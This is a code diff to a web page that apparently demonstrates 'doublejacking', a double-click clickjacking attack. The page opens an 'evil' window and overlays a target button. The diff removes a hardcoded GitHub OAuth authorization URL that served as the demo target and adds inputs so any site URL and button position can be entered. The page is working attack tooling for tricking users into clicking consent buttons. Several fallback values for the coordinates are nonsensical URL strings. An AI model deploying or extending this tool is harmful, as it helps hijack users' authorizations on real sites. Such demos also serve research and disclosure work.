@@ -27,10 +27,36 @@
            </scr`+`ipt>`);
             
             evilWindow.document.close();
+
+            function getDynamicUrl() {
+    const urlInput = document.getElementById("siteUrl").value;
+    return urlInput ? urlInput : 'https://defaulturl.com'; // fallback URL if input is empty
+}
+            function getUpdown() {
+    const urlInput = document.getElementById("Updown").value;
+    return urlInput ? urlInput : 'https://defaulturl.com'; // fallback URL if input is empty
+}
+            function getleftRight() {
+    const urlInput = document.getElementById("leftRight").value;
+    return urlInput ? urlInput : 'https://defaulturl.com'; // fallback URL if input is empty
+}
+            function getwidth() {
+    const urlInput = document.getElementById("width").value;
+    return urlInput ? urlInput : 'https://defaulturl.com'; // fallback URL if input is empty
+}
+            function getheight() {
+    const urlInput = document.getElementById("height").value;
+    return urlInput ? urlInput : 'https://defaulturl.com'; // fallback URL if input is empty
+}
         };
     }
     </script>
     
     <!-- Replace value's below with the URL and top, left, width, height of a button you want to doublejack with -->
-    
-    <button onclick="openDoubleWindow('https://github.com/login/oauth/authorize?client_id=df19f42e2cca94327906&scope=read%3Auser%2Cuser%3Aemail&redirect_uri=https%3A%2F%2Faccounts.zoho.in%2Faccounts%2Foauthcallback&state=4613baba44552c86b9406269b4ab6e80959ae64f419a7dfcd65cc88327aa3c4c3211ce355cc4371bc25c6cf93b1acd0c6f5890b6e1122b6512c0a22d3ee0752b7a72fabc12b2b30393c0deca86a61491f822647d5562fa63674dfb9ae99a1cf687b300e7d2de961e36c9ca136789e831e76d6a05d21122d9e5e315b8481ad6d1aa603102ef22194c5797e10b80df6101&allow_signup=true',420, 500.5, 260, 43)">Start Demo</button>
+    <input type="text" id="siteUrl" placeholder="Enter site URL" />
+    <input type="text" id="Updown" placeholder="Up/Down" />
+    <input type="text" id="leftRight" placeholder="left/Right" />
+    <input type="text" id="width" placeholder="width" />
+    <input type="text" id="height" placeholder="height" />
+
+    <button onclick="openDoubleWindow(getDynamicUrl(),getUpdown(), getleftRight(), getwidth(), getheight())">Start Demo</button>
